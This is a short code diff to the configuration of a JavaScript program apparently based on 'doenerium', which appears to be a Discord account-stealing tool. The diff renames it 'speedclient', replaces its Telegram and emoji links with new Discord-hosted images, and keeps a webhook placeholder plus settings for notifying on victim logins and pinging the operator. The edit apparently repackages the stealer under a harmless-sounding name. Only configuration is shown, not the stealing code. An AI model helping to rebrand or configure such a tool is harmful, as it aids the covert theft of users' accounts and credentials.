@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "speedclient",
 
     webhook: "REPLACE_ME",
 
@@ -20,16 +20,16 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@speed"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "speed",
         footer: {
-            text: `doenerium | t.me/doenerium`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `speedclient`,
+            icon_url: "https://media.discordapp.net/attachments/1124774543521751204/1138081264675594351/Technology_Review_1.jpg",
         },
-        href: "https://t.me/doenerium",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "speedclient",
+        avatar_url: "https://media.discordapp.net/attachments/1124774543521751204/1138081264675594351/Technology_Review_1.jpg"
     },
 
     badges: {
